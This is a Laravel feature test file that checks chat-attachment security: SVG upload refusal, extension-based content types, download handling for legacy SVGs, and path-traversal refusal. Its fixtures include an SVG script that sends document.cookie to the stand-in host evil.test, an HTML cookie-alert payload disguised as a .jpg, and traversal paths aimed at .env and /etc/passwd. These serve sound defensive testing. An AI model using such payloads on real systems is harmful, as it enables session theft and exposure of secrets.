<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/**
 * Content-type truth for chat attachments.
 *
 * The 4D rework (SignedAttachmentUrlTest) already pins WHO may fetch a file:
 * membership-checked issuer, five-minute signed link, strict path shape.
 * These tests pin WHAT comes back: the upload side whitelists by extension
 * (so a lying file can get in), and the serve side used to SNIFF the type
 * from file content — an HTML payload wearing a .jpg name streamed back as
 * text/html, inline, executing in this app's origin with the viewer's
 * session. nosniff alone could not help: it stops the browser overriding
 * the declared type, and sniffing made the declared type the malicious one.
 * Now the extension DECLARES the type, SVG (a script container wearing an
 * image extension) is refused at upload, and anything unknown — legacy .svg
 * files included — comes back as an opaque download.
 */
class ChannelAttachmentSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('local');
    }

    private function staff(): User
    {
        $user = User::factory()->create(['status' => 'active', 'user_type' => 'staff']);
        Sanctum::actingAs($user);

        return $user;
    }

    private function upload(UploadedFile $file)
    {
        return $this->post('/api/v1/admin/channels/attachments', ['file' => $file]);
    }

    /** Issue a signed link for $path (as its uploader) and fetch the bytes. */
    private function fetchViaSignedLink(string $path)
    {
        $url = $this->getJson('/api/v1/admin/channels/attachments/serve?path=' . urlencode($path))
            ->assertOk()
            ->json('url');

        // The signed link is what a browser tab opens: no Authorization header.
        $this->app['auth']->forgetGuards();

        return $this->withHeaders(['Authorization' => ''])->get($url);
    }

    public function test_svg_uploads_are_refused(): void
    {
        $this->staff();
        $svg = UploadedFile::fake()->createWithContent(
            'diagram.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>document.location="https://evil.test/"+document.cookie</script></svg>'
        );

        $this->upload($svg)->assertStatus(422);
    }

    public function test_html_wearing_a_jpg_name_streams_as_an_image_never_sniffed(): void
    {
        $this->staff();

        $fake = UploadedFile::fake()->createWithContent(
            'photo.jpg',
            '<!doctype html><script>alert(document.cookie)</script>'
        );
        $path = $this->upload($fake)->assertStatus(201)->json('path');

        $resp = $this->fetchViaSignedLink($path);
        $resp->assertOk();
        $resp->assertHeader('Content-Type', 'image/jpeg');
        $resp->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringStartsWith('inline', $resp->headers->get('Content-Disposition'));
    }

    public function test_a_legacy_svg_comes_back_as_an_opaque_download(): void
    {
        $uploader = $this->staff();

        // Stored before SVG left the whitelist. Plant the file and the
        // uploader claim the upload endpoint would have recorded.
        $path = 'channel-attachments/2026/09/legacy.svg';
        Storage::disk('local')->put($path, '<svg onload="alert(1)"></svg>');
        \Illuminate\Support\Facades\Cache::put(
            'channel-attachment-uploader:' . sha1($path), $uploader->id, now()->addDay()
        );

        $resp = $this->fetchViaSignedLink($path);
        $resp->assertOk();
        $resp->assertHeader('Content-Type', 'application/octet-stream');
        $this->assertStringStartsWith('attachment', $resp->headers->get('Content-Disposition'));
    }

    public function test_known_document_types_keep_their_declared_type(): void
    {
        $this->staff();

        $doc  = UploadedFile::fake()->createWithContent('notes.txt', 'hello floor');
        $path = $this->upload($doc)->assertStatus(201)->json('path');

        $resp = $this->fetchViaSignedLink($path);
        $resp->assertOk();
        // text/plain cannot script; what must never happen is a sniff
        // promoting it (or anything else) to text/html.
        $resp->assertHeader('Content-Type', 'text/plain; charset=utf-8');
        $resp->assertHeader('X-Content-Type-Options', 'nosniff');
    }

    public function test_the_issuer_refuses_crafted_paths_and_strangers(): void
    {
        $this->staff();

        foreach ([
            'channel-attachments/../../../.env',
            '.env',
            'channel-attachments//etc/passwd',
        ] as $bad) {
            $this->getJson('/api/v1/admin/channels/attachments/serve?path=' . urlencode($bad))
                ->assertStatus(403);
        }

        // A path nobody linked in any of my conversations reads as not found.
        $path = 'channel-attachments/2026/09/not-mine.jpg';
        Storage::disk('local')->put($path, 'x');
        $this->getJson('/api/v1/admin/channels/attachments/serve?path=' . urlencode($path))
            ->assertStatus(404);
    }
}
